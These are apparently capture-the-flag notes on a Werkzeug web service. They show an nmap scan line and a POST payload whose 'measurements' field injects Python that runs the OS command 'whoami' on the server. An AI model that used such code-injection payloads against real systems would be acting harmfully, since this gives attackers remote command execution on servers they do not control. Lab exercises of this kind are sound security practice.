# nmap
```
30105/tcp open  http    Werkzeug httpd 1.0.0 (Python 2.7.17)
|_http-title: \xF0\x9F\x8C\x8C on Venzenulon 9
```

# werkzeug console 
-  allows POST req to modify webapps script by passing our own variable
```python
data = {'ingredient': 'dials', 'measurements': '__import__(\'os\').popen(\'whoami\').read();'}
```

